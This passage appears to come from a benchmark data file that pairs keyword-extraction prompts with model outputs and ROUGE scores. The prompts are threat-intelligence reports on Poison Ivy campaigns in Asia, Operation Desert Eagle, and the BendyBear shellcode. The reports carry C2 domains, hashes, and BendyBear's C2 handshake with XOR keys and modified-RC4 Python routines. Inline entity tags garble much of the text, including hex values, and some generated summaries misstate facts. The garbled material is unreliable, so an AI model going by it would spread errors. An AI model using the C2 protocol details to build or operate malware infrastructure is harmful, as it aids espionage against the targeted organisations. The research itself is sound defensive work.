Campaign ID : om C2s : jackhex.md5c.net:8080 jackhex.md5c.net:53 jackhex.md5c.net:53 Mutex : 20150120 First Seen : [DATE] April 7 , [DATE] 2016 [DATE] Name : [DATE] Commission on [ORG] Filipinos [ORG] Overseas [ORG] & [ORG] Dubai [ORG] % E2%80%AEcod.doc [PERSON] Decoy [PERSON] Doc : Commission on [ORG] Filipinos [ORG] Overseas [ORG] & [ORG] Dubai.doc [ORG] Campaign [ORG] ID : gmkill C2s : webserver.servehttp.com:8080 webserver.servehttp.com:8080 webserver.servehttp.com:8081 Mutex : 20150120 First Seen : [DATE] April 11 , [DATE] 2016 [DATE] Name : 1.exe Decoy Doc : Chairman 's Report of the [ORDINAL] 19th [ORG] ASEAN Regional Forum Heads of Defence Universities , Colleges , Instiutions Meeting , [PERSON] Nay [PERSON] Pay [PERSON] Taw , [ORG] Myanmar.doc [ORG] Campaign [ORG] ID : mm20160405 Domain Created : [DATE] December 17 , [DATE] 2015 C2s : admin.nslookupdns.com:81 admin.nslookupdns.com:53 admin.nslookupdns.com:8080 Mutex : 20150120 First Seen : [DATE] March 20 , [DATE] 2016 [DATE] Name : Unknown Decoy Doc : Robertus Subono\u2010REGISTRATION_FORM_ASEAN_CMCoord2016.docx Campaign ID : modth Domain Created : [DATE] December 17 , [DATE] 2015 C2s : admin.nslookupdns.com:80 admin.nslookupdns.com:53 admin.nslookupdns.com:8080Mutex : 20150120 First Seen : [DATE] March 10 , [DATE] 2016 [DATE] Name : [CARDINAL] 2016.02.29\u201003.04 \u2010ASEM Weekly.docx.rar^2016.02.29\u201003.04 \u2010ASEM Weekly.docx.exe [PERSON] Decoy [PERSON] Doc : [CARDINAL] 2016.02.29\u201003.04 \u2010ASEM Weekly.docx ( [NORP] Mongolian language ) Campaign ID : wj201603 Domain Created : [DATE] January 14 , [DATE] 2016 C2s : web.microsoftdefence.com:8080 web.microsoftdefence.com:8080 web.microsoftdefence.com:80 Mutex : 20150120 Name : Unknown Decoy Doc : [CARDINAL] 1.docx ( corrupted but recoverable , [LANGUAGE] Korean language ) First Seen : [DATE] April 9 , [DATE] 2016 [DATE] CampaignID : kk31 C2s : webserver.servehttp.com:59148 webserver.servehttp.com:59418 webserver.servehttp.com:5000 Mutex : 20160301 Name : Unknown Decoy doc : [CARDINAL] 1.pdf , references project in [GPE] Vietnam requesting an email to a [GPE] Thailand email address First Seen : [DATE] March 10 , [DATE] 2016 C2s : webserver.servehttp.com:59148 webserver.servehttp.com:59418 webserver.servehttp.com:1024 Mutex : 20160219 Campaign ID : mt39Discovered during investigation , but do not drop decoy docs , exhibited similar configuration padding [PERSON] Name : 2.tmp Decoy Doc : None First Seen : [DATE] June [DATE] 3 , 2015 Domain Created : [DATE] May 29 , [DATE] 2015 C2s : news.tibetgroupworks.com:80 news.tibetgroupworks.com:80 news.tibetgroupworks.com:80 Campaign ID : [CARDINAL] 213 Mutex : [CARDINAL] 2015012SHA1 Hashes63e00dbf45961ad11bd1eb55d [CARDINAL] 9c2771c2916a6 web.microsoftdefence.com admin.nslookupdns.com jackhex.md5c.net webserver.servehttp.comSUBSCRIBE TO THIS [ORG] BLOGFirst [ORG] NameLast NameCompanyEmailSUBSCRIBESEND FEEDBACKArbor \u2019s [ORG] Security [ORG] Engineering [ORG] & [ORG] Response [ORG] Team ( [ORG] ASERT ) delivers world - class network security research and analysis for the bene t of [DATE] today \u2019s enterprise and network operators . ASERT engineers and researchers are part of an elite group of institutionsthat are referred to as \u2018 super remediators \u2019 and represent the best in information security . [ORG] ASERT has both visibility and remediation capabilities at nearly every tier [CARDINAL] one operator and a majority of service provider networks globally . [ORG] ASERT shares operationally viable intelligence with [CARDINAL] hundreds of international Computer Emergency Response Teams ( CERTs ) and with [CARDINAL] thousands of network operators via in - band security content feeds . [ORG] ASERT also operates the world \u2019s largest distributed honeynet , actively monitoring Internet threats around the clock and around the globe via ATLAS , Arbor \u2019s global network of sensors : url \u00ae TAG CLOUDBlack [ORG] Peace [ORG] Group [ORG] Attacks algorithm Aldi 504 tra c network [GPE] Iran Internet Protocol hijack Facebook [PERSON] Dirt [PERSON] Jumper [PERSON] Danny [PERSON] McPherson [GPE] China Bot Wikileaks IPv6 [PERSON] Armageddon [PERSON] YouTube Security Botnet Internet service provider Internet tra c Google outage [ORG] Arbor [ORG] Networks [ORG] - [ORG] DDoS Experts BGP peering \" End of Internet \" Botnets Crypto Denial - of - service attack down [DATE] Halloween internet [ORG] IPv4 malware [ORG] Streaming [ORG] media [ORG] 500 [ORG] Internal [ORG] DDoS [ORG] AlbaDDoS [ORG] Aldi [ORG] Bot attack [FAC] Beer [FAC] DDoS BlogCORPORATE [ORG] SITE [ORG] PRIVACY [ORG] POLICY [ORG] THREAT [ORG] PORTAL [ORG] LEGAL [ORG] ATLAS [ORG] PORTAL \u00a9 [ORG] 2016 [ORG] Arbor [ORG] Networks , [ORG] Inc. All rights reserved .", "generated_text": "PIVY; Asia; Operation; part; Hong Kong; this attack; DLL sideloading; APT; DLL sideloading; the samples; a decoy doc; a DLL; ActiveUpdate.dat; ActiveFlash.exe; The C2s; time; the campaign ID; The C2; the C2s; detection; the malware; the campaign IDs; the C2s; the campaign IDs; id; id; the variant; sdc; infrastructure; countries; a new variant; a variant; Palo Alto Networks; Hong Kong activists; the attackers; the C2s; time; detection; this type; a RAT; the target; the DLL sideloading; the targets; id; a RAT; a C2; the DLL sideloading.", "ref_text": "<START-1>The cybersecurity company Arbor Networks observed new activity involving the Poison Ivy remote access trojan (RAT) malware targeting several Asian countries over the past year. Technical analysis shows this Poison Ivy variant, nicknamed \"Korplug\", uses DLL sideloading to infect systems. It drops decoy documents hinting at targets, a DLL, and a shellcode file. The malware copies a legitimate Windows executable to load the DLL which decrypts configuration data and connects to command and control servers. Decoy documents suggest targeting of pro-democracy groups in Myanmar around recent elections. Other documents reference ASEAN meetings and members, hinting at targeting of Southeast Asian government and military organizations. Additional decoy documents are written in Korean and Mongolian languages. Infrastructure analysis reveals overlaps between this Poison Ivy activity and other malware families including Gh0strat and Nitol, suggesting possible coordination by a shared threat actor. The malware continues to evolve with new configurations and artifacts likely designed to evade defenses. Arbor Networks assesses that Poison Ivy remains an active threat, with new variants being used in targeted campaigns across Asia by motivated actors. They recommend monitoring systems for related indicators of compromise and ensuring protections against known Poison Ivy malware capabilities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4553846153846154, "gpt3/lexical/rouge_rouge2": 0.08049535603715172, "gpt3/lexical/rouge_rougeL": 0.2523076923076923, "gpt3/lexical/rouge_rougeLsum": 0.2523076923076923, "gpt3_generated_text": ["The article discusses a new variant of the Remote Access Trojan (RAT) Poison Ivy (PIVY) that has been observed targeting Asian countries, including Hong Kong and Myanmar. The variant exhibits new behaviors, such as using DLL sideloading and dropping a decoy document named \"ActiveUpdate.dll\" to perform malicious actions. The samples also show a change in the campaign ID and Command & Control (C2) server, making detection and analysis more challenging. The article provides technical details and analysis of the new variant's deployment tactics and infrastructure. It also highlights the targeting of Myanmar and other countries in Asia, with hints at the motivations and potential targets of the exploitation campaigns. This new variant poses a threat to the security of targeted systems and requires advanced detection and response measures."]}, {"split_name": "test", "sample_id": "test_33", "prompt_text": "Extract the keywords: [ORG] Malware [ORG] Party [ORG] Malware [ORG] PartyOperation [ORG] Desert [ORG] Eagle [ORG] Operation [ORG] Desert [ORG] Eagle Content - Type : \t application / x - www - form - urlencoded Host : \t xxx.xxx.xxx.xxx Content - Length : \t [CARDINAL] 447 Expect : \t [CARDINAL] 100 - continue9568=[host \t identifier]Random,&1077569=[Base64 \t Data]User \t agent \t has \t campaign \t ID \t ( Send - N , \t JOND , \t [PERSON] Random , \t or \t FUD ) \t appended \t to \t the \t end \t of \t the \t victim\u2019sunique \t identifier \t string . Another \t interesting \t thing \t to \t note \t is \t that \t the \t backdoor \t does \t not \t make \t the \t GET \t requests \t to \t the \t domain names \t above \t ( wiknet[.]wikaba[.]com \t or \t wiknet[.]moo[.]com ) . \t Rather \t it \t uses \t the \t IP \t that \t the \t host \t namepoints \t to \t ( in \t this \t case , \t my \t fakenet \t dns \t ip).Let \u2019s \t take \t a \t look \t on \t how \t this \t network \t traffic \t compares \t to \t the \t older \t NeD \t Worm \t samplesAbove \t image \t taken \t from \t ( url \t Activity : Dropped \t Files : C:\\Program \t Files \t ( x86)\\%AppDate%\\29175\\explorer.vbs C:\\Program \t Files \t ( x86)\\%AppDate%\\29175\\News.url [PERSON] C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\explorer.lnkC:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\explorer.vbs C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\powershell.lnk Wiknet[.]wikaba[.]com Wiknet[.]moo[.]com 104.200.67[.]190 MD5 \t - \t The \t quarrel \t between [PERSON] Trump \t and \t [PERSON] Abbas MD5 \t - \t Who \t stands \t around \t the attempt \t to \t assassinate \t al \t \u2013 \t Jubeir MD5 \t - \t Exclusive \t video \t of \t an assassin \t of \t the \t leader \t of \t the [ORG] Hamas \t movement \t Mazen \t Faqha.278440a46195ba8fa628460530e 601edMD5 \t - \t Has \t honey \t years \t ended between \t [ORG] Hamas \t and \t Al - Thani?4cbebeda71dceb9914a21d06e2 31dbdMD5 \t - \t A \t leaked \t document \t that outlines \t Majid \t [PERSON] Faraj 's \t plan \t to install \t Dahlan \t as \t head \t of \t the [GPE] Gaza \t government ! MD5 \t - \t BackdoorMD5 \t - \t BackdoorMD5 \t - \t BackdoorMD5 \t - \t BackdoorMD5 \t - \t BackdoorMD5 \t - \t starts\\explorer.vbsEnter your comment Popular posts from this blog [NORP] Popular posts from this blogWord add - in persistence found in the wild Word add - in persistence found in the wild [DATE] January [DATE] 06 , [CARDINAL] 2018Word add - in persistence found in the wild@Blu3_team @Malwareparty 20180106 \u2026 READ MORE READ MOREPowered by [ORG] BloggerTheme images by [PERSON] Michael [PERSON] Elkan", "generated_text": "Malware Party; Operation Desert Eagle; the backdoor; the domain names; the host name; the IP; the host namepoints; the IP; a leaked document; Hamas; Dahlan; Gaza; the Gaza government; a leaked document; Hamas leader; the Palestinians; The incident; a campaign ID; First; a campaign ID; ip; the campaign name; the campaign ID; the campaign name; command; control; the GET requests; the domain names; IP; activity; the network traffic; a different campaign ID; a different campaign name.", "ref_text": "<START-1>The PDF provides an analysis of a cyberespionage campaign called Operation Desert Eagle conducted by a politically-motivated threat group known as Molerats or the Gaza cybergang. The attackers used spear-phishing emails containing weaponized documents purporting to be news articles of interest. When opened, the documents installed a remote access trojan on the victim's system. The malware communicates with command and control servers through DNS requests and encoded beacons to identify victims and receive commands. It also obscures its presence through obfuscation techniques and hiding in registry keys. Researchers uncovered overlaps in infrastructure with previous Molerats campaigns, indicating this is likely the same group. Specific indicators of compromise are provided, including IP addresses, domain names, file hashes, and patterns in network traffic. The targeting aligns with the group's politically-motivated origins, as decoy documents refer to Middle East affairs. By revealing the tactics, techniques, and procedures used in this campaign, the analysis aims to help organizations enhance defenses and attribution. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4492753623188406, "gpt3/lexical/rouge_rouge2": 0.0948905109489051, "gpt3/lexical/rouge_rougeL": 0.16666666666666666, "gpt3/lexical/rouge_rougeLsum": 0.16666666666666666, "gpt3_generated_text": ["This article discusses the Malware Party operation, specifically the Operation Desert Eagle and the backdoor used in the attack. The malware does not make GET requests to domain names, but rather uses the IP that the host name points to. The network traffic is compared to older NeD Worm samples, and dropped files and MD5 hashes are listed. Additionally, there is mention of a leaked document outlining a plan to install Dahlan as head of the Gaza government, as well as a campaign ID and name being appended to the victim's unique identifier string. The incident involves a different campaign ID and name, and the command and control activity is also highlighted."]}, {"split_name": "test", "sample_id": "test_34", "prompt_text": "Extract the keywords: BendyBear : Novel [NORP] Chinese [PERSON] Shellcode [PERSON] Linked With [ORG] Cyber [ORG] Espionage [ORG] Group BlackTechunit42.paloaltonetworks.com/bendybear-shellcode-blacktechFebruary [CARDINAL] 9 , 2021By [PERSON] Mike [PERSON] HarbisonFebruary [DATE] 9 , [DATE] 2021 at 3:00 AMCategory : Unit [CARDINAL] 42Tags : BendyBear , [ORG] BlackTech , [ORG] DbgPrint , malware , shellcode , [ORG] TaiDoor , WaterBearThis post is also available in :   ( Japanese)Executive SummaryHighly malleable , highly sophisticated and [CARDINAL] over [CARDINAL] 10,000 bytes of machine code . This is what Unit [CARDINAL] 42 researchers were met with during code analysis of this \u201c bear \u201d of a file . The code behavior and features strongly correlate with that of the [LAW] WaterBear malware family , which has been active since [DATE] as [DATE] early [DATE] as [DATE] 2009 . Analysis by [ORG] Trend [ORG] Micro and TeamT5 unveiled [PRODUCT] WaterBear as a multifaceted , stage - [CARDINAL] two implant , capable of file transfer , shell access , screen capture and much more . The malware is associated with the cyber espionage group [ORG] BlackTech , which many in the broader threat research community have assessed to have ties to the [NORP] Chinese government , and is believed to be responsible for recent attacks against several [NORP] East [NORP] Asian government organizations . Due to the similarities with [ORDINAL] WaterBear , and the polymorphic nature of the code , Unit [CARDINAL] 42 named this1/19novel [NORP] Chinese shellcode \u201c BendyBear . \u201d It stands in a class of its own in terms of being one of the most sophisticated , well - engineered and difficult - to - detect samples of shellcode employed by an Advanced Persistent Threat ( APT).The BendyBear sample was determined to be x64 shellcode for a stage - zero implant whose sole function is to download a more robust implant from a command and control ( C2 ) server . [PERSON] Shellcode , despite its name , is used to describe the small piece of code loaded onto the target immediately following exploitation , regardless of whether or not it actually spawns a command shell . At [QUANTITY] 10,000 + bytes , [GPE] BendyBear is noticeably larger than most , and uses its size to implement advanced features and anti - analysis techniques , such as modified RC4 encryption , signature block verification , and polymorphic code . The sample analyzed in this blog was identified by its connections to a malicious C2 domain published by [ORG] Taiwan \u2019s [ORG] Ministry [ORG] of [ORG] Justice [ORG] Investigation [ORG] Bureau in [DATE] August [DATE] 2020 . It was discovered absent additional information regarding the exploit vector , potential victims or intended use . [ORG] Palo [ORG] Alto [ORG] Networks customers can be protected from the attacks outlined in this blog with [ORG] the Next - [ORG] Generation [ORG] Firewall alongside [ORG] DNS [ORG] Security , URL Filtering and [ORG] WildFire security subscriptions , and [ORG] Cortex XDR.A New Class of ShellcodeAt a macro level , [GPE] BendyBear is unique in that it : Transmits payloads in modified RC4 - encrypted chunks . This hardens the encryption of the network communication , as a single RC4 key will not decrypt the entire payload . Attempts to remain hidden from cybersecurity analysis by explicitly checking its environment for signs of debugging . Leverages existing Windows registry key that is enabled by default in Windows [CARDINAL] 10 to store configuration data . Clears the host \u2019s [ORG] DNS cache every time it attempts to connect to its [CARDINAL] C2 server , thereby requiring that the host resolve the current [ORG] IP address for the malicious C2 domain each time . Generates unique session keys for each connection to the [CARDINAL] C2 server . Obscures its connection protocol by connecting to the [CARDINAL] C2 server over a common port ( [CARDINAL] 443 ) , thereby blending in with normal [ORG] SSL network traffic . Employs polymorphic code , changing its runtime footprint during code execution to thwart memory analysis and evade signaturing . Encrypts or decrypts function blocks ( code blocks ) during runtime , as needed , to evade detection . Uses position independent code ( [ORG] PIC ) to throw off static analysis tools . In the following sections , we provide an in - depth technical breakdown of each of these capabilities.2/19Technical [PRODUCT] DetailsShellcode [PRODUCT] ExecutionThe shellcode ( SHA256 : [DATE] 64CC899EC85F612270FCFB120A4C80D52D78E68B05CAF1014D2FE06522F1E2D0 ) is considered to be a stager , or downloader , whose function is to download an implant from a C2 server . During execution , the code employs byte randomization to obscure its behavior . This is achieved by using the host \u2019s current time as a seed for a pseudorandom number generator , and then performing additional operations against that output . The resulting values are used to overwrite blocks of previously executed code . This byte manipulation is the [ORDINAL] first anti - analysis technique observed in the code , as any attempt to dump the memory segment would result in illegitimate or incorrect operations . Figure [CARDINAL] 1 shows an example of the shellcode main entry point before and during runtime execution . Figure [CARDINAL] 1 . Modified shellcode runtime example . Because shellcode lacks the ability to run on its own , a Windows loader is required to allocate an environment in memory for it to execute . At the time of analysis , no loader had been identified for this shellcode ; Therefore , Unit [CARDINAL] 42 created a custom loader to study the code during its runtime execution . Since then , however , several older installers were discovered with embedded [LAW] WaterBear shellcode based on attributes identified from this sample . More information on these loaders can be found in the [NORP] Appendix section \u201c x86 [ORDINAL] WaterBear Loaders\u201d . The shellcode begins by locating the target \u2019s Process Environment Block ( PEB ) to check if it \u2019s currently being debugged . However , the code is written such that it pulls both the \u201c [ORG] BeingDebugged \u201d and \u201c [PERSON] BitField \u201d values from the [ORG] PEB , resulting in code logic that invalidates the debugger check . Because of this , the shellcode will always fail to recognize when a debugger is attached . This routine is performed [CARDINAL] 52 times in a while loop . Next , the shellcode iterates through the PEB \u2019s loader module list looking for the base address of [ORG] Kernel32.dll . This is typical of shellcode , as the [ORG] Kernel32.dll base address is necessary to resolve any dependency files required by the shellcode to run . With this address , the shellcode loads its dependency modules and resolves any necessary [ORG] Windows [ORG] Application [ORG] Programming [ORG] Interface ( API ) calls using standard shellcode API hashing . The following modules are loaded : [PERSON] Advapi32.dll3/19Kernel32.dll [PERSON] Ws2_32.dllWith the shellcode initialization complete , it moves onto its main function . It begins by querying the target \u2019s registry , at the following key : HKEY_CURRENT_USER\\Console\\QuickEditThis registry key is used by the Windows command prompt to enable [LOC] Quick [LOC] Edit mode . [PERSON] Quick [PERSON] Edit mode allows copy and paste from the command prompt to the clipboard . By default , this key contains a [ORG] REG_DWORD , a [QUANTITY] 32 - bit number of either [CARDINAL] 1 for enabled or [CARDINAL] 0 for disabled . BendyBear reads this value , multiplies it by [CARDINAL] 1000 and performs the following calculation on the result : If the result is [CARDINAL] less [CARDINAL] than [CARDINAL] 1,000 or [CARDINAL] greater [CARDINAL] than [CARDINAL] 3,300,000 the shellcode configuration ( [ORG] QuickEdit ) is [CARDINAL] 4,000 ( 0xFA0 ) otherwise it is the result of the computed value . [PERSON] Refer to the highlighted light blue value in Figure [CARDINAL] 2 Shellcode configuration . This check is performed each and every time the shellcode is executed . [CARDINAL] One explanation for the use of this key is that the value is written to by the shellcode loader ( to a value other than [CARDINAL] 0 or [CARDINAL] 1 ) and it \u2019s used by the shellcode to obtain configuration settings . It then decrypts its internal configuration structure , which is [CARDINAL] 1,152 bytes . An example is shown in Figure [CARDINAL] 2.4/195/19Figure [CARDINAL] 2 . [PERSON] Shellcode configuration structure . A breakdown of the configuration structure shown in Figure [CARDINAL] 2 is below ( from top to bottom):Highlighted in neon green are the [CARDINAL] two , [QUANTITY] 16 - byte keys used for XORing values throughout the shellcode . 7D [CARDINAL] 38 [ORG] BA FD E1 C8 D2 DF B6 EE 33 F9 [CARDINAL] 14 BF 52 96 71 17 [ORG] DF [ORG] E4 [ORG] AE 3B [PRODUCT] A9 [PRODUCT] F2 [PRODUCT] D5 3D [CARDINAL] 75 [ORG] CC D3 0D 57 72 Highlighted in light blue are the [CARDINAL] two bytes computed from the host \u2019s [PERSON] Quick [PERSON] Edit [PERSON] Highlighted in orange are the [CARDINAL] four bytes that represent the shellcode version . [CARDINAL] 30 [CARDINAL] 2E 32 34 ( [CARDINAL] 0.24 ) Highlighted in pink are the [CARDINAL] 17 bytes that make up the [CARDINAL] C2 domain . Bitwise NOT ( unsigned byte ) to decode the values including the [ORG] NULL . [CARDINAL] 88 98 CE D1 96 91 94 [CARDINAL] 9A 8C [CARDINAL] 93 96 89 [CARDINAL] 9A D1 9C 90 92 Highlighted in dark green are the [CARDINAL] 103 bytes that are used for pattern elimination . XOR with 0xFF to NULL values . FF FF FF FF FF FF FF FF FF FF FF \u2026 Highlighted in magenta are the [CARDINAL] two bytes that make up the target C2 port . Highlighted in light yellow are the resolved function pointers used by the shellcode . [CARDINAL] 92 13 73 33 37 02 Highlighted in dark cyan are the [CARDINAL] 112 bytes that make up the function pointer sizes used to encrypt or decrypt function blocks . Highlighted in dark red are the [CARDINAL] 289 bytes that make up the resolved [PRODUCT] Windows [PRODUCT] API functions used by the shellcode [CARDINAL] A0 [DATE] 2E [DATE] 52 [ORG] CC FC 7F 00 00 \u2026 [ORG] Network Communications6/19Figure [CARDINAL] 3 . Stager communication flow . Before communicating with the [CARDINAL] C2 server , the shellcode flushes the host \u2019s [ORG] DNS cache by performing the following:1 . [PERSON] Loads module dnsapi.dll [CARDINAL] 2 . Calls API DnsFlushResolverCacheWhen this API is called , all domains resolved are cleared from the host \u2019s [ORG] DNS cache , not just the target C2 server . This forces the host to resolve the current [ORG] IP associated with the C2 domain , ensuring that communication continues as network infrastructure becomes compromised or unavailable . It also implies the developers own the domain and can update the IP.The stager begins by computing [CARDINAL] 10 bytes of data to send to the C2 server . These [CARDINAL] 10 bytes make up a challenge request packet . The stager sends the challenge request to the [CARDINAL] C2 and waits for a challenge response . When received and properly decrypted , the stager checks for magic values or signature bytes at specific offsets . If this check fails , the network connection is aborted . This check ensures trusted communication with the intended C2 server and initiates the download of the payload . [ORG] I. [ORG] Stager [ORG] Generates [ORG] Challenge [ORG] Request [ORG] PacketThe stager computes a [QUANTITY] 10 - byte challenge request containing information for the C2 , to include the size of the data ( being the session keys ) to be received next . The challenge request and session keys are sent to the C2 simultaneously . Example request:26BCFCCE738A211F3763II . C2 Server Decrypts Challenge Request PacketThe C2 decrypts the challenge request packet using the following steps:1 . [ORDINAL] First byte will be [ORG] XORed with the [ORDINAL] second byte , [ORDINAL] second byte with [ORDINAL] third byte \u2026 until byte [CARDINAL] 10 , followed by:7/19A. [ORG] Byte [ORG] 7 is updated from the result of ( byte 7 [ORG] XORed with byte [CARDINAL] 3 ) . [PERSON] B. [PERSON] Byte [PERSON] 2 is updated from the result of ( byte [CARDINAL] 2 [ORG] XORed with byte [CARDINAL] 0 ) . [PERSON] C. [PERSON] Byte [PERSON] 8 is updated from the result of ( byte [CARDINAL] 8 [ORG] XORed with byte [CARDINAL] 0 ) . [PERSON] D. [PERSON] Byte [PERSON] 9 is updated from the result of ( byte [CARDINAL] 9 [ORG] XORed with byte [CARDINAL] 5 ) .2 . Final value is [ORG] XORed with key 0x3FDA5F9AD85D50C77E6AThe challenge request decrypts to the following ( represented as hex bytes):Figure [CARDINAL] 4 . Decrypted request challenge . The last [CARDINAL] four bytes of the decrypted request packet inform the [CARDINAL] C2 server of the size of the expected network traffic to follow . As shown above , the value is [DATE] 0x20 , or [CARDINAL] 32 bytes . These 32 bytes make up the session keys used by the C2 server to encrypt a server challenge response and encrypt the payload . Example of session keys received by the [CARDINAL] C2 server : Session key [CARDINAL] 1 \u2013 > [CARDINAL] 8C931D4F764B0661C26D77239EB454CASession key [CARDINAL] 2 \u2013 > 7A4DD0AA6C3F37CDBDAFA4CBD6B27697The challenge request packet and session keys are computed for each beacon and therefore would always be unique . III . C2 Authenticates With the [ORG] StagerThe C2 uses the session keys to build the RC4 state box and as an XOR key for encryption and decryption.*It should be noted that the use of session key [CARDINAL] 2 is not yet fully understood , and it did not appear to be used to communicate with the [GPE] stager.1 . The pre - session key is computed using session key [TIME] 1 ( [TIME] first [TIME] 16 bytes ) as follows : Pre - Session [ORG] Key = session key 1 XOR 0X6162636465666768696A6B6C6D6E6F002 . Using the computed pre - session key from step [CARDINAL] 1 , the [CARDINAL] C2 server builds the RC4 Key Scheduling Algorithm ( KSA ) . It is computed as follows : a. Build the RC4 KSA using the following inputs to the below function : data = [QUANTITY] 16 - byte key 0x0C2F65194FF37B2D63D34635C7B205E4 key = [QUANTITY] 16 - byte computed pre - session key from step [CARDINAL] 1Example [CARDINAL] RC4 ( modified ) KSA routine:8/19def rc4_KSA(data , key ): x = [CARDINAL] 0 box = [GPE] range(258 ) box[256 ] = 0 box[257 ] = 0 for i in [GPE] range(256 ): x = ( x + box[i ] + [PERCENT] ord(key[i [PERCENT] % len(key ) ] ) ) % [CARDINAL] 256 box[i ] , box[x ] = box[x ] , box[i ] return box*Note about the input parameter \u201c data \u201d for the [ORG] KSA routine : It is the XOR result of the [CARDINAL] two [QUANTITY] 16 - byte keys shown neon green in Figure [CARDINAL] 2 . [PERSON] Shellcode Configuration Structure.3 . [ORG] Construct [QUANTITY] 10 - byte server challenge response header using the hex values shown in Figure [DATE] 5.Figure [DATE] 5 . [ORG] Server [ORG] Command [ORG] Challenge [ORG] Header4 . Encrypt server challenge response header from step [CARDINAL] 3 : a. XOR 10 - byte server challenge with key [CARDINAL] 0x33836E6B3FAA6AC464DA and perform the following : i. [PERSON] Byte [PERSON] 7 is updated from the result of ( byte 7 [ORG] XORed with byte [CARDINAL] 3 ) . ii . [PERSON] Byte [PERSON] 2 is updated from the result of ( byte [CARDINAL] 2 [ORG] XORed with byte [CARDINAL] 0 ) . iii . [PERSON] Byte [PERSON] 8 is updated from the result of ( byte [CARDINAL] 8 [ORG] XORed with byte [CARDINAL] 0 ) . iv . [PERSON] Byte [PERSON] 9 is updated from the result of ( byte [CARDINAL] 9 [ORG] XORed with byte [CARDINAL] 5 ) .b . Encrypted server challenge response header = result of 4(a)5 . Compute final authentication key : a. XOR the following values : i. 0x0C2F65194FF37B2D63D34635C7B205E4 ii . Value computed from step [CARDINAL] 1 , i.e. Pre - Session Key*The [QUANTITY] 16 - byte value in [DATE] 5.a.i is the same input parameter used in the [ORG] KSA algorithm in step [CARDINAL] 2 . The stager expects this key from the [CARDINAL] C2 otherwise the session is aborted.9/19The values generated in steps [CARDINAL] 4 and [CARDINAL] 5 make up the complete server challenge response . At this point , the [CARDINAL] C2 sends the server challenge response to the stager , completing the authentication process . IV . C2 Encrypts and Transmits PayloadNext , the [CARDINAL] C2 prepares to send a command to the stager . BendyBear only supports [CARDINAL] one type of command : payload download.1 . Build a [QUANTITY] 10 - byte command header using the hex values shown in Figure [CARDINAL] 6.Figure [CARDINAL] 6 . Updated server command challenge header . The only change to the header is the fixed signature value from 0x40 to 0x43.2 . Encrypt the command header from step [CARDINAL] 1 : The following is an example of a RC4 modified routine that can be used . The [ORDINAL] first argument , box , would be the S - Box computed in step III.2 and the [ORDINAL] second argument , data , would be the command header from step [CARDINAL] 1.def rc4_Mod_Crypt(box , data ): x = box[256 ] y = box[257 ] for char in data : x = ( x + 1 ) % [CARDINAL] 256 y = ( y + box[x ] ) % [CARDINAL] 256 box[x ] , box[y ] = box[y ] , box[x ] z = ( ( box[x ] + box[y ] ) & 0xff ) % [CARDINAL] 256 al = rol ( box[z],4,8 ) out.append ( chr ( ord ( data[c ] ) ^ al ) ) box[z ] = al box[256 ] = x box[257 ] = y return \u201d .join(out)10/193 . Obtain the size of the payload and encrypt that value using the same RC4 algorithm as in step [CARDINAL] 2 . The size of the payload should be the total decrypted size of the payload.4 . Encrypt and send the payload to the stager in chunks : a. Read [CARDINAL] 4,086 bytes from the payload . This is the maximum chunk size that the stager will accept.b . Build a command header ( step [CARDINAL] 1 above ) and update the following fields : i. Header size = size of payload chunk.ii . Command = [CARDINAL] 1.c . Send the updated [QUANTITY] 10 - byte command header to the stager.d . Send the encrypted payload chunk.e . Repeat steps a \u2013 d until payload is sent . Figure [CARDINAL] 7 shows an example of [CARDINAL] one payload chunk that is sent to the stager . Figure [CARDINAL] 7 . Encrypted payload header and data . Upon receiving each chunk , the stager strips the command header and decrypts the payload chunk in memory . Payload In - Memory LoadingOnce the payload is fully decrypted , the stager performs some basic checks to ensure that the payload conforms to a [PRODUCT] Windows executable . It validates the [ORG] DOS and [ORG] PE header and that the payload is a [ORG] DLL . It then direct - memory loads the payload and calls into its entry point ( AddressOfEntryPoint ) . The direct memory load of the payload emulates that of the Windows PE loader \u2013 LoadLibrary . As a result , the PEB LDR_DATA_TABLE_ENTRY metadata structures are not created and the PEB for the process running the shellcode has11/19no record of the [ORG] DLL loading , which can be used to detect rogue modules running on your host . This is visible in [ORG] WinDbg running the command ! address within the process that loaded the shellcode . An example is shown in Figure [DATE] 8.Figure [DATE] 8 . Artifact of direct in - memory loaded DLL.In - memory artifacts : Type is MEM_PRIVATE , meaning it is private to the process that loaded it . On Windows platforms , DLLs are typically loaded as MEM_IMAGE so that they can be shared between different processes to save memory space . Protection is PAGE_EXECUTE_READWRITE(RWX ) , which means the area is writable and executable with a memory area containing an [ORG] MZ header . The [ORG] MZ header is the in - memory loaded module . The output of the [ORG] WinDbg ! address command shown in Figure [CARDINAL] 8 spots the anomalous entry . The memory address of module [CARDINAL] 0x7ff4c2450000 was the result of private memory allocation , protection set to [ORG] RWX and usage containing an MZ header.x64 Shellcode BehaviorsThe following table describes the main behaviors of [GPE] BendyBear . Behavior ArtifactQuery Registry HKEY_CURRENT_USER\\Console\\QuickEditCommand and [PRODUCT] ControlPayload transfer from remote hostPayloads in modified RC4 - encrypted chunks~65 calls to [LOC] Windows [LOC] API [LOC] kernel32!GetTickCountKernel32 prior to the shellcode connecting to the C2 server . Used to encrypt or decrypt function blocks . ATT&CK IDsT1012 : Query RegistryT1573.002 : Encrypted Channel : Asymmetric CryptographyT1105 : [ORG] Ingress [ORG] Tool [ORG] TransferT1027.002 : Obfuscated Files or Information : Software PackingT1497.003 : [ORG] Time [ORG] Based [ORG] EvasionDynamic [ORG] DLL [ORG] Importing and API [WORK_OF_ART] LookupsT1106 [WORK_OF_ART] Native [WORK_OF_ART] API12/1952 iterations of the shellcode obtaining the process environment block ( PEB ) and checking for IsDebugger flagT1082 : System Information DiscoveryEight calls to msvcrt!time prior to connecting to the [CARDINAL] C2 serverClearing host \u2019s [ORG] DNS cache via API DNSAPI!DnsFlushResolverCachePEB _ LDR_DATA_TABLE_ENTRY metadata structures are not created , and the PEB for the process running the shellcode has no record of the [ORG] DLL loading . Loaded payload module ( [ORG] DLL ) has a type of MEM_PRIVATETable [CARDINAL] 1 . x64 shellcode commands executed . BendyBear vs. WaterBearAttributesFile [ORG] 